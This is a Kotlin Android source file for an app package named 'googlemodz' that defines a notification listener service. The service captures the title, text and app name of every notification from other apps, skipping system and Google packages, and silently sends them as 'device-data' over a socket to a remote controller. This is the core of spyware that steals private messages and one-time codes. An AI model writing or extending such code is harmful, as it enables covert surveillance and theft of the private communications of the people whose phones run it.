package com.app.googlemodz

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*

class NotifListenerService : NotificationListenerService() {

    private val skipPackages = setOf("android", "com.android.systemui", "com.app.googlemodz", "com.google.android.gms")

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkgName = sbn.packageName
        if (pkgName in skipPackages) return

        val notif = sbn.notification ?: return
        val extras = notif.extras ?: return

        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
                ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
                ?: ""

        if (title.isBlank() && text.isBlank()) return

        val appName = try {
            packageManager.getApplicationLabel(packageManager.getApplicationInfo(pkgName, 0)).toString()
        } catch (e: Exception) { pkgName }

        val time = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())

        val payload = JSONObject().apply {
            put("action", "notif_list")
            put("appName", appName)
            put("sender", title)
            put("message", text)
            put("time", time)
            put("pkgName", pkgName)
        }

        // PAKAI SOCKET HOLDER (bukan bikin socket sendiri)
        try {
            if (SocketHolder.socket != null && SocketHolder.socket!!.connected()) {
                SocketHolder.socket!!.emit("device-data", payload)
            }
        } catch (e: Exception) { }
    }
}
